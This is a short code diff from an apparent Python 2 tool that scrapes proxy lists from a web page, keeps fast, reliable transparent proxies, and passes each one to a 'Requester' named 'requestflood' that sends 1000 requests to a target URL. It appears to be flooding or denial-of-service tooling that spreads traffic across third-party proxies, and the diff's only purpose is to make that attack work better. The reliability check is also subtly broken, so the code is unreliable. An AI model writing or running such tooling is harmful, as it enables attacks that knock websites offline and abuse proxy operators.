@@ -48,15 +48,20 @@ class ProxyScraper:
 		self.parse_document(r.content, url)
 
 	def parse_document(self, html, url):
+		
 		soup = BeautifulSoup(html)
 		soup.prettify()
+		
 		for proxy in soup.findAll('prx:proxy'):
-			ip = proxy.find('prx:ip').string
-			port = proxy.find('prx:port').string
+			
+			if proxy.find('prx:type').string == 'Transparent' and int(proxy.find('prx:latency').string) <= 1000 and int(proxy.find('prx:reliability').string >= 9000):
 
-			print '\nSwitching to proxy server: %s:%s\n' % (ip, port)
-			requestflood = Requester(1000, url, ip, port)
+				ip = proxy.find('prx:ip').string
+				port = proxy.find('prx:port').string
 
+				print '\nSwitching to proxy server: %s:%s\n' % (ip, port)
+
+				requestflood = Requester(1000, url, ip, port)
 
 
 a = ProxyScraper(sys.argv[1], sys.argv[2])
